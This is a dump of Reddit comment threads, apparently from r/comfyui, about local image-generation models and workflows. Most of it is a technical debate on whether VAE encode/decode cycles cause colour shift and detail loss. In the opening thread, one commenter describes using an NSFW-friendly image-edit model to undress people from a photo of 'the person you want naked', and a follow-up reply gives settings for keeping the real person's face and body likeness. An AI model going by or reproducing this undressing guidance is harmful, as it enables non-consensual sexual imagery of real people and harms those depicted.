          "text": "I'll throw these in here. I'm not listing any hidden gems. These are well known staples.\n\nThe first two are Pony finetunes that focus on realism. The third is RedCraft, they make all kinds of finetunes and always tend to lean towards realism.\n\n[https://civitai.com/models/443821/cyberrealistic-pony?modelVersionId=2581228](https://civitai.com/models/443821/cyberrealistic-pony?modelVersionId=2581228)\n\n[https://civitai.com/models/372465/pony-realism?modelVersionId=914390](https://civitai.com/models/372465/pony-realism?modelVersionId=914390)\n\n[https://civitai.com/models/958009?modelVersionId=2462789](https://civitai.com/models/958009?modelVersionId=2462789)\n\nAnd I'll echo my own endorsement of \n\n[https://huggingface.co/Phr00t/Qwen-Image-Edit-Rapid-AIO/tree/main](https://huggingface.co/Phr00t/Qwen-Image-Edit-Rapid-AIO/tree/main)\n\nMaybe this is the first and only editing model that is being designed to be very NSFW friendly. It's fucking great.\n\nIt just makes what we used to have to do so much easier. In the past if I wanted someone naked I'd use an inpainting model. It works but can be finicky and is slower. You can undress people using WAN 2.2 as well. But Qwen-Image-Edit-Rapid-AIO **is the easiest**. And it's very high quality too. Just load in a photo of the person you want naked and prompt \"Her clothes are now gone\" - DONE\n\nI feel like this is an ability all men have wanted since the dawn of time - and now we have it! lol",
          "score": 11,
          "created_utc": "2026-01-20 13:33:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o12zwku",
              "author": "Pitiful_Season4294",
              "text": "Hey there, I'm fairly new to this and after seeing your review, I downloaded the Qwen's AIO model by Phroot but it was freezing up my system (16GB VRAM+16GB RAM), so I went with the Q5 KM gguf versions listed by Phil2Sat here: \n\n[https://huggingface.co/Phil2Sat/Qwen-Image-Edit-Rapid-AIO-GGUF/tree/main/v90](https://huggingface.co/Phil2Sat/Qwen-Image-Edit-Rapid-AIO-GGUF/tree/main/v90)\n\n  \nI was unable to get the output to match the face and even the body proportions in the input pic, is there a particular set of configurations you'd recommend (cfg, steps, scheduler etc.)? Or could you please share or direct me to the workflow which works well. Many thanks!",
              "score": 1,
              "created_utc": "2026-01-22 17:37:05",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o17ikez",
                  "author": "Mugaluga",
                  "text": "I have some advice for you. The default workflow works perfectly. So 4 steps is all you need. In fact increasing the steps decreases the likeness of the person.\n\nIt's best if your input image is high resolution (higher than 1024x1024) and it's also good if your output resolution is high too. At first I was trying with 1024x1024 and was getting some good results and some bad. I upped my output resolution to 1440x1440 or 1920x1080 and found the likeness was matching a LOT more often.\n\nIt's possible that a Q5 quant is degrading the likeness but I don't know that. Also, the Q5 quants you linked to are of version 9, so quite a bit older than the latest v22.\n\nI can say that v20 works very well and some have said that v18 maintains likeness the best.\n\nI was able to find Q5 quants of the newer versions for you. Try one of these, and good luck...\n\n[https://huggingface.co/Arunk25/Qwen-Image-Edit-Rapid-AIO-GGUF/tree/main](https://huggingface.co/Arunk25/Qwen-Image-Edit-Rapid-AIO-GGUF/tree/main)",
                  "score": 3,
                  "created_utc": "2026-01-23 09:08:07",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0meajr",
          "author": "tinsin3479",
          "text": "Indeed, you should go to Civitas. There's everything you want there, nsfw.",
          "score": 6,
          "created_utc": "2026-01-20 06:07:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0pfpb4",
          "author": "Zealousideal_Roof_96",
          "text": "So much good info. Thank you all from a newbie to ai.",
          "score": 3,
          "created_utc": "2026-01-20 18:01:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ptt1a",
          "author": "TekaiGuy",
          "text": "Models in the same family can regress, so an earlier version of a model can perform better at a particular task than a later iteration. Keep that in mind and look at the comments/ratings on Civit as they give you an idea of which versions perform better.\n\nIf you're looking for true customization, I would recommend a pipeline of samplers, not just one model. Since each model excels at something unique, you should start with the model that gives you the pose/camera you want, then send the image to the next ksampler/advanced ksampler to give you color/lighting, and hook the depth map of the first image into it so it keeps the same shape, then send that image with its depth map to the next ksampler which can provide the texture/details (I like Z-image for this step).\n\nThat's just an example, you can invent any pipline you want with each step adding something the previous model couldn't.",
          "score": 3,
          "created_utc": "2026-01-20 19:04:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0nkmuv",
          "author": "imakeboobies",
          "text": "For image to vid assuming you mean Wan2.2 and not ltxv2, and assuming you mean checkpoints and not Lora‚Äôs your options are fairly limited. Personally I use the enhanced lightning models, but the SFW works and then add the right NSFW Lora‚Äôs in. Smoothmix is another option but I personally find it gives me horrible gens.",
          "score": 1,
          "created_utc": "2026-01-20 12:17:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0orxym",
          "author": "etupa",
          "text": "No idea why wan2.2Remix last i2v models aren't more liked. With the painter node and a few LoRA it's just perfect... With the last face swap LoRA using Klein9b you're pretty much covered for any image input x)))",
          "score": 1,
          "created_utc": "2026-01-20 16:12:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0qy1wh",
              "author": "South_Prize_2350",
              "text": "Could you share your workflow and the LoRa you mentioned?",
              "score": 1,
              "created_utc": "2026-01-20 22:11:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0u4mn0",
          "author": "trainity_lab",
          "text": "The secret is to have good image quality. Then with WAN2.2 is amazing. Go check my videos. Of course sometimes is kind of weird so just change the picture",
          "score": 1,
          "created_utc": "2026-01-21 11:18:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0n8k2c",
          "author": "Adept_Internal_9443",
          "text": "What's about the Originals? They call themselves \"girls\" oder \"boys\".",
          "score": 1,
          "created_utc": "2026-01-20 10:39:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0mvjzy",
          "author": "SimplyBlue09",
          "text": "If ever you are also into NSFW fic or eroticas, I highly suggest redquill. The platform has been great for not only creating and generating fics, but also looking at the works of others since it also has a forum for those.",
          "score": 0,
          "created_utc": "2026-01-20 08:37:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0nsvaa",
          "author": "bfume",
          "text": "I hear there‚Äôs a lot of them on only fans¬†",
          "score": -1,
          "created_utc": "2026-01-20 13:11:54",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qkog35",
      "title": "Colour shift is not caused by the VAE",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/0lhl6roc43fg1.png",
      "author": "Luke2642",
      "created_utc": "2026-01-23 11:33:33",
      "score": 127,
      "num_comments": 58,
      "upvote_ratio": 0.94,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkog35/colour_shift_is_not_caused_by_the_vae/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o18mt0i",
          "author": "afinalsin",
          "text": ">If you pass it through six times you get a slight fading effect, that is all\n\nNo, that is not all. The VAE will degrade the details of the image. Below is a bunch of comparisons between input image and 8x trips through a VAE encode/decode cycle (scroll to zoom in):\n\n[Here is a robot](https://imgsli.com/NDQ0NjY3).\n\n[Here is an anime creature.](https://imgsli.com/NDQ0NjY4)\n\n[Here is a random demon woman](https://imgsli.com/NDQ0Njcy).\n\n[Here is a Fernando Alonso](https://imgsli.com/NDQ0Njcx).\n\n[Here is a lower resolution Fernando Alonso](https://imgsli.com/NDQ0Njgy).\n\nYour methodology isn't great because you are running a single 1080 x 1935 image through the VAE so the loss of detail is much less noticeable. When you run a 1 megapixel image through the same process (like you would with image editing, for example) the degradation is much more apparent. Even if the the colors remain basically the same, the destruction of details is too much to be dismissed as a \"slight fading effect\". \n\n---\n\n>It's some sort of groupthink, when no-one actually tested it.\n\nOkay, let's test it. I'll create an image from two inputs, and run 8 edits on consecutive outputs. \n\n[Here](https://i.postimg.cc/dJvcwHqW/grid-00027.png) I make all edits directly with latents, so it was only one encode/decode cycle. 0 Degradation.\n\n[Here](https://i.postimg.cc/R472s7cq/grid-00028.png) I make all edits with images in an encode/decode cycle, changing the seed each prompt. Nothing super noticeable, if at all. There might be if I had static elements that are supposed to remain untouched by the model. Test that next.\n\n[Here](https://i.postimg.cc/dwYxyhz0/grid-00029.png) I make all edits with images in an encode/decode cycle and keep the seed static. There are tons of errors, and they compound from one gen to the next. The wings and midsection are the most noticeable, but there are errors all over the place. So, I can confidently say leaving the seed static from gen to gen will fuck up your image. Now lets test that VAE cycle.\n\n---\n\n[Here](https://i.postimg.cc/rcC97QPW/vae-00001.png) is a run of edits using the VAE.\n\n[Here](https://i.postimg.cc/tytz82M6/vaeless-00001.png) is a run of edits using only latents.\n\nBoth of these runs are the exact same seed, exact same prompts. The differences are subtle, but the result is clear. [Here is the final output](https://imgsli.com/NDQ0NzAw). \n\nCompare the detail on the house and the tree above it on the mug. Every edit had a clear instruction: \"Leave the coffee mug exactly as it is.\" And it did, but the VAE got in the way and degraded the details.\n\nSo yeah, it was some sort of \"groupthink\", but the group was thinking based on knowledge gained over years of doing this. The color degradation was likely based on an unchanging seed, but passing into and out of latent space will still fuck up your image so it's best to avoid it as much as possible. \n\nEven a VAE as good as the Flux2 Vae will fuck up your image with enough cycles, because the tiny mistakes compound with each other. If I ran that mug through ten more edits the results would be even more stark. That's also why you mask when you inpaint, otherwise your final result ends up like mud.",
          "score": 31,
          "created_utc": "2026-01-23 14:03:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18o6fq",
              "author": "Luke2642",
              "text": "You make some good points, but I have no idea what your workflow is for each of those edit images or what you're trying to prove. There is a slight quality/detail loss each you encode/decode with the VAE, I never said there wasn't.\n\nThe OP was doing 3 edits and seeing colour shift on that exact image. The colour shift was not caused by the VAE, as demonstrated.",
              "score": 4,
              "created_utc": "2026-01-23 14:10:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18rwcv",
                  "author": "afinalsin",
                  "text": "Just reread that thread, and we both overlooked something very simple: \n\n>\"I am using the default workflow. Just removed the \"ImageScaleToTotalPixels\" node to keep the output reso same as input.\"\n\nThe input resolution of OP's image is 1536 x 2752. Homie was trying to gen 2x base resolution. \n\nEven with that full resolution, [I couldn't replicate the errors](https://i.postimg.cc/WsgrJ7Jt/Comfy-UI-0003.webp). The image deteriorated, as to be expected, but the color wasn't one of them, so I'm stumped.\n\nEdit to answer edit:\n\n>what you're trying to prove\n\nJust countering your statement that \"you only get a slight fading\". \n\n>There is a slight quality/detail loss each you encode/decode with the VAE, I never said there wasn't.\n\nI see now that you were referring strictly to color, but that statement can easily be read as the fading being the only detrimental effect at being passed in and out of the VAE. My reading of that made it seem like you did indeed say there wasn't a quality/detail loss, which is what I was countering. My bad. On a completely related note, I hate English. \n\nStill, if someone reads this and gets something out of it, job done, I don't mind arguing against a point I've misinterpreted.",
                  "score": 8,
                  "created_utc": "2026-01-23 14:29:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o180u4y",
          "author": "Most_Way_9754",
          "text": "Can you explain why the laten multiply removes the fade? Should we include this after the vae decode on a regular generation?",
          "score": 11,
          "created_utc": "2026-01-23 11:48:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "o183x1o",
              "author": "Luke2642",
              "text": "There must be something in the encode/decode that is squashing the weights or pixel values slightly each time, or, it could be a cumulative rounding error, but that seems unlikely. Latent space geometry is hard to conceptualise, but I guess that the absolute magnitudes somehow control the overall contrast, and the relative magnitudes control the features.\n\nIf you want to boost the contrast, yeah, multiply is a quick and dirty way to do it?",
              "score": 8,
              "created_utc": "2026-01-23 12:10:49",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o190kqt",
                  "author": "RickyRickC137",
                  "text": "Is there a cleaner way, then?\n\nAlso, does it work with qwen edit?",
                  "score": 1,
                  "created_utc": "2026-01-23 15:12:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o183kqt",
              "author": "Character-Bend9403",
              "text": "I wanna know aswell i am a beginner and would love to know  the answer to this , if you feel explaining it.",
              "score": 1,
              "created_utc": "2026-01-23 12:08:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o18ilex",
          "author": "Justify_87",
          "text": "https://github.com/Jelosus2/comfyui-vae-reflection\n\n\nThis may be interesting for you",
          "score": 9,
          "created_utc": "2026-01-23 13:41:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18pg1u",
              "author": "Luke2642",
              "text": "That is very interesting to me, thank you!",
              "score": 1,
              "created_utc": "2026-01-23 14:17:01",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1ibubl",
              "author": "Nexustar",
              "text": "I thought i was looking at a Rothko at first.",
              "score": 1,
              "created_utc": "2026-01-24 22:18:45",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o184lpz",
          "author": "infearia",
          "text": "I don't claim to understand fully what you're talking about, but it seems you're onto something. There are times I notice a HUGE increase in brightness after only ONE single edit operation. Maybe you could open an issue or a discussion on ComfyUI's official GitHub repo?",
          "score": 7,
          "created_utc": "2026-01-23 12:15:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o187wbo",
          "author": "TBG______",
          "text": "Pixel space ranges from 0 to 255, while latent space is normalized to 0‚Äì1 float32 in best cases and compressed by a factor of 8. Rounding errors are common, but they do not cause image saturation like in these examples.\n\nSure, I didn‚Äôt test this with Flux 2, but it looks like the Flux model tends to add a bit more saturation to the input image on each pass. My suspicion is that Flux has a built-in corrector that works ‚Äúwell‚Äù on the first pass but then accumulates over subsequent passes. The problem is that it seems to be applied only to unchanged areas, so ideally your correction pass should also target only those areas.\n\nHave you tried whether the same behavior happens with img2img without inpainting? Did you keep the same seed on each pass, or did you change it? In any case, it‚Äôs usually best to do your generation first, then crop and stitch the original background back into the image using the same mask, and only then proceed with the next pass.",
          "score": 3,
          "created_utc": "2026-01-23 12:38:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18bigi",
              "author": "TheSquirrelly",
              "text": "SwarmUI has some color correction options when using flux inpainting.  I wonder if it's a similar issue at all.  Though it looks like it applies this through a custom \"SwarmImageCompositeMaskedColorCorrecting\" node.\n\nhttps://preview.redd.it/ld6ri81rj3fg1.png?width=1229&format=png&auto=webp&s=2dbcc1be2748357a97259927089c74c88bf90f8c",
              "score": 1,
              "created_utc": "2026-01-23 13:00:51",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18s54n",
              "author": "Formal-Exam-8767",
              "text": "> while latent space is normalized to 0‚Äì1 float32\n\nAre you sure? I thought latent tensor values are unbound, with approximately zero‚Äëmean.",
              "score": 1,
              "created_utc": "2026-01-23 14:30:47",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1azkx7",
              "author": "Geekn4sty",
              "text": "Isn't the latent tensor autocast as the same dtype of the model weights? They must undergo matrix multiplication in the forward pass, I'm pretty sure torch will not allow them to have mismatched precision.",
              "score": 1,
              "created_utc": "2026-01-23 20:38:00",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ecllm",
                  "author": "TBG______",
                  "text": "That‚Äôs correct. \n\n* **Latent ‚Üí pixel conversion happens** ***after*** **decoding via the VAE**\n* The VAE decoder output is:\n   * float (usually fp16/fp32)\n   * then clamped / scaled to `[0,1]`\n   * *then* converted to 8-bit (0‚Äì255) for images (bottleneck)",
                  "score": 1,
                  "created_utc": "2026-01-24 09:11:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o184q4b",
          "author": "Minimum-Let5766",
          "text": "When inpainting flux1.dev, I get color fading in the final image of the non-masked area .  But the masked area which was manipulated remains at original saturation, so it never looks quite right.  Hopefully this latent multiply can help.",
          "score": 2,
          "created_utc": "2026-01-23 12:16:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18ge1r",
          "author": "ReasonablePossum_",
          "text": "Tried with the latentmultiply at 2, it gives me an oversaturated and degraded output\n\nhttps://preview.redd.it/0emk7lnmp3fg1.png?width=293&format=png&auto=webp&s=4de3a2264f64303ab542ea289274a7ccf70f5bbc",
          "score": 2,
          "created_utc": "2026-01-23 13:29:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18qg1m",
              "author": "TBG______",
              "text": "If you multiply 0.2% of any color by 2, you simply get 0.4%. That‚Äôs just post-processing, not an actual solution.",
              "score": 2,
              "created_utc": "2026-01-23 14:22:07",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18ix6a",
              "author": "Luke2642",
              "text": "I have no idea what your workflow is. Are simply replicating encode-decode 6 times for fun?",
              "score": 1,
              "created_utc": "2026-01-23 13:42:57",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o18oorc",
              "author": "Cute_Ad8981",
              "text": "It depends on the vae. For example I had to use 0.75 with the latent multiply for wan 2.2 5b. OP is using 2.0 after 3-4 encodings/decodings. maybe test 1.25 or 0.75 and adjust.",
              "score": 1,
              "created_utc": "2026-01-23 14:13:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18sy7i",
              "author": "Formal-Exam-8767",
              "text": "That's expected since it's a hack. There is no semantic explanation what multiplying every value by 2 in latent space means.",
              "score": 1,
              "created_utc": "2026-01-23 14:34:57",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o18jctv",
          "author": "pwillia7",
          "text": "This guy diffuses",
          "score": 2,
          "created_utc": "2026-01-23 13:45:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18p8oq",
              "author": "Luke2642",
              "text": "Technically this is just encoding and decoding üòú",
              "score": 1,
              "created_utc": "2026-01-23 14:15:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18pbu4",
                  "author": "pwillia7",
                  "text": "ha -- fair play",
                  "score": 1,
                  "created_utc": "2026-01-23 14:16:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fqush",
          "author": "Clasyc",
          "text": "Commenting not specifically to OP, but with some general points for other commenters. I see a lot of people missing a key piece of information when talking about moving forward with VAEs.\n\nLatent ‚Üí Image (VAE Decode) is a deterministic operation and does not lose information relative to the latent. Image ‚Üí Latent (VAE Encode) is a lossy operation.\n\nSo it‚Äôs kinda obvious that if you repeatedly chain multiple VAE encode + VAE decode operations, you will eventually lose more and more information. At the same time, you start ‚Äúsaturating‚Äù specific patterns that the VAE is good at resolving and encoding. As a result, overall quality degrades, and the image becomes more and more sharp, contrasty, and ‚ÄúAI-looking‚Äù in the end.\n\nIt doesn‚Äôt matter what tricks you do between those operations - once you keep re-encoding, you are inevitably losing original information.",
          "score": 2,
          "created_utc": "2026-01-24 15:16:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18564l",
          "author": "ANR2ME",
          "text": "Nice finding üëç\n\nDo we need lower multiplier value if it was for the 2nd image? ü§î since 2.0 is for the 3rd image, which already faded twice.",
          "score": 1,
          "created_utc": "2026-01-23 12:19:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o185e05",
          "author": "Formal-Exam-8767",
          "text": "Do VAE encode, modify part of the image (while in latent space), do VAE decode, whole image tone changes/shifts.",
          "score": 1,
          "created_utc": "2026-01-23 12:21:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o185tzr",
              "author": "Luke2642",
              "text": "You're confusing local and global features in the latent space. I mentioned in the other post that latent geometry is complex!",
              "score": 1,
              "created_utc": "2026-01-23 12:24:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18bmej",
                  "author": "Formal-Exam-8767",
                  "text": "Yes, and you can't replicate color tone shift without changing the image in latent space. Same thing happens with tiled VAE decode.",
                  "score": 1,
                  "created_utc": "2026-01-23 13:01:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o187m7i",
          "author": "TidalFoams",
          "text": "I've always thought about it like the ksampler is making a copy of a very slightly altered copy (like a game of telephone). Any problems it introduces (color change in this case) get amplified in the next pass. It's not just the color that changes but subtle detail gets lost over iterations through a ksampler. If you do it enough times you get monster people.",
          "score": 1,
          "created_utc": "2026-01-23 12:36:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o18biw5",
          "author": "Cute_Ad8981",
          "text": "Your post is interesting, because I'm searching for an easy solution for that problem.  \nI'm using latent multiply too and it helped, but are you sure this is fully lossless and can be applied to all different vaes (wan for example)? I often chained multiple samplers for video extension and it was pretty hard to pinpoint the exact value for latent multiply.",
          "score": 1,
          "created_utc": "2026-01-23 13:00:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1bw9c4",
              "author": "physalisx",
              "text": "It is absolutely not and OP is completely wrong. VAE encode/decode will absolutely degrade your image, there is no \"lossless\" way around that.",
              "score": 2,
              "created_utc": "2026-01-23 23:16:38",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o18jdiz",
              "author": "Luke2642",
              "text": "It's going to be trial and error.\n\nComfyUI will auto-detect the model type in the ksampler and apply the correct latent space scale and shift before doing the model denoising, then rescale and shift it afterwards. So there's lots of opportunity for shifts to creep in.",
              "score": 1,
              "created_utc": "2026-01-23 13:45:23",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18o17i",
                  "author": "ZenEngineer",
                  "text": "I wonder if there's some way to test that. What happens if you run a few steps with 0 denoise? Would ksampler still scale and shift?",
                  "score": 1,
                  "created_utc": "2026-01-23 14:09:49",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1a43jo",
          "author": "Spare_Ad2741",
          "text": "would same methodology apply to video creation also?",
          "score": 1,
          "created_utc": "2026-01-23 18:12:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1agx3k",
          "author": "Simple-Variation5456",
          "text": "its crazy to see what people come up with, struggle with and take minutes to correct and edit in their workflows while oldboi photoshop just did it better 20 years ago.  \nI generate in comfyui (or directly in photoshop with firefly fill / flux / nano) and copy the output into photoshop as a layer, can copy already made masks and can refine and edit everything on seperate layers whenever i want.  \nHow you even precisely pick a color for certain things?  \nCan you even mask stuff above 4-8k?  \n  \nDo people actually edit their outputs over and over?  \nI'm already getting mad when NanoPro/Flux2Pro/Seedream 4.5 just slightly change the image even tho telling or masking areas to keep and only change x.  \nThis sounds worse than people had to cut out stuff and glue them together physically (analog) before photoshop was a thing.",
          "score": 1,
          "created_utc": "2026-01-23 19:10:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1bh215",
          "author": "MidSolo",
          "text": "Could you have made it any more difficult to figure out what is going on in your workflow?",
          "score": 1,
          "created_utc": "2026-01-23 21:59:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1biv7d",
              "author": "Luke2642",
              "text": "Load image\nEncode\nDecode\nEncode\nDecode\nEncode\nDecode\nPreview\nEncode\nDecode\nEncode\nDecode\nEncode\nDecode\nPreview¬†",
              "score": 1,
              "created_utc": "2026-01-23 22:08:28",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1bpd94",
          "author": "superstarbootlegs",
          "text": "VAE will degrade your images coming out of Latent Space though. You do it enough (put it through another wf) and still apply color shift you will have very shit results which is why color shift alone is not enough to solve it.\n\nOr has something new been involved to resolve that because last year it was the bane of extending WAN based workflow results. Trying to swap multiple characters out with VACE got nasty and would require compositing to resolve mostly due to passing in and out of Latent Space from the VAE encode decode.\n\nMaybe I misunderstood what you are trying to show here. (I work mostly in video which is where I see this issue).",
          "score": 1,
          "created_utc": "2026-01-23 22:40:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1bqn0p",
              "author": "Luke2642",
              "text": "Yes, small loss of detail each time. I was showing that the vae doesn't damage the latent much, even 6 encodes 6 decodes. The ksampler damages it a lot more, and causes colour shift.",
              "score": 1,
              "created_utc": "2026-01-23 22:47:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1cj07c",
                  "author": "superstarbootlegs",
                  "text": "isnt that its job - making pixels.",
                  "score": 1,
                  "created_utc": "2026-01-24 01:20:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1brsdn",
          "author": "YMIR_THE_FROSTY",
          "text": "Colors are defined by matrix thats in some ComfyUI file, bit lazy to find it, so ask AI.",
          "score": 1,
          "created_utc": "2026-01-23 22:53:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1c5gy4",
          "author": "Several_Honeydew_250",
          "text": "Anytime you pass to latent space and back, you lose quality.  This is why if your not shift your model class (XL/PONY/FLUX/KRAE etc..) leave it in LATENT, don't decode until the end.  Also, you're using the same VAE on all of them... so, it should maintain color space.",
          "score": 1,
          "created_utc": "2026-01-24 00:06:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ej5fx",
          "author": "TBG______",
          "text": "https://preview.redd.it/150m7twbs9fg1.png?width=379&format=png&auto=webp&s=8c49da4c2aae3e221801fd845fa6cd82c21b32a3\n\nThis is a difference overlay showing all the changes made by the edit sampling with the prompt: *‚Äúchange the color of the shirt to black, keep the background as is.‚Äù* Flux2 Klein 9B tends to alter everything in the image, which is typical behavior and not unique to Flux2 Klein.\n\nAfter observing the results, the changes made by the model are not what I would expect in a real-world scenario. For instance, if a large portion of the image is occupied by a person wearing a white T-shirt and you change it to black, the overall color balance of the image shifts. Reflections, lighting, and even the camera‚Äôs exposure or white balance adapt to the new mid-gray of the scene.   As example looking at the arm, the upper part should show a different light reflection, but it doesn‚Äôt. For me, that means using masking along with a low-percentage blend of the unmasked areas could be sufficient.",
          "score": 1,
          "created_utc": "2026-01-24 10:12:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1eltbb",
              "author": "TBG______",
              "text": "This is after a straightforward fix\n\nhttps://preview.redd.it/7864o8wlz9fg1.png?width=373&format=png&auto=webp&s=049a7892e898d8d119adb38f49b17b338aa52f73\n\nwill post wf later",
              "score": 1,
              "created_utc": "2026-01-24 10:37:02",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ema1k",
                  "author": "TBG______",
                  "text": "https://preview.redd.it/x4v68k210afg1.png?width=1634&format=png&auto=webp&s=35bb23d10d6dc113c749fe22bc948a5306fe8248\n\nUse Sam to select the element, then expand and blur the mask, apply compositing with the mask and unmasked area, and if you like blend old over new as an optional intermediate solution.",
                  "score": 1,
                  "created_utc": "2026-01-24 10:41:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1f292l",
              "author": "TBG______",
              "text": "https://preview.redd.it/1y5gvizmgafg1.png?width=1433&format=png&auto=webp&s=c0688fe805d0c9b2ba7c43a8de06970bab26907b\n\nAfter testing it with SAM, which requires manual input of elements, I‚Äôve created a new node that can automatically detect the affected areas without SAM, allowing the process to be fully automated.\n\nHowever, I noticed that many contour edges are affected by the mode changes, even with slight repositioning of the edges. This could make the issue a bit tricky to resolve. I will uplode the node to the TBG Takeaways : The TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and compression noise. \n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here: [https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920) (free access).",
              "score": 1,
              "created_utc": "2026-01-24 12:53:31",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1k7uq0",
          "author": "Capitan01R-",
          "text": "Interesting I was working on the same thing just yesterday bc I knew I was not seeing things, I created a quick node to adjust the decoder and i gotten better colors but since it was manual control it was difficult to choose which works best, and this seems interesting!",
          "score": 1,
          "created_utc": "2026-01-25 04:29:18",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qhlvmb",
      "title": "Flux.2-[Klein]: Lucy MacLean (Ella Purnell) Multiple points of view from the same image",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/9jy00bl4deeg1.png",
      "author": "supermaramb",
      "created_utc": "2026-01-20 00:27:15",
      "score": 123,
      "num_comments": 26,
      "upvote_ratio": 0.86,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "No workflow",
      "permalink": "https://reddit.com/r/comfyui/comments/1qhlvmb/flux2klein_lucy_maclean_ella_purnell_multiple/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o0n3vyp",
          "author": "RIP26770",
          "text": "You are just using my WF LMFAO!\n\n[https://www.reddit.com/r/StableDiffusion/comments/1qg5ph5/flux\\_2\\_klein\\_4b\\_vs\\_9b\\_multi\\_camera\\_angles\\_one/](https://www.reddit.com/r/StableDiffusion/comments/1qg5ph5/flux_2_klein_4b_vs_9b_multi_camera_angles_one/)",
          "score": 32,
          "created_utc": "2026-01-20 09:56:23",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0nhte9",
          "author": "Achaeminuz",
          "text": "https://preview.redd.it/q20al5f5uheg1.jpeg?width=1206&format=pjpg&auto=webp&s=bced69c5b3e4fff3dcb9dfbe82106a041009c4b7",
          "score": 10,
          "created_utc": "2026-01-20 11:56:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0v3qc3",
              "author": "ColloidalSuspenders",
              "text": "Appreciate different angles of cow human centipede",
              "score": 5,
              "created_utc": "2026-01-21 14:54:00",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0mbbx1",
          "author": "Violent_Walrus",
          "text": "Without a workflow or explanation, this is just somebody‚Äôs random internet story.",
          "score": 28,
          "created_utc": "2026-01-20 05:44:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0n3xpl",
              "author": "RIP26770",
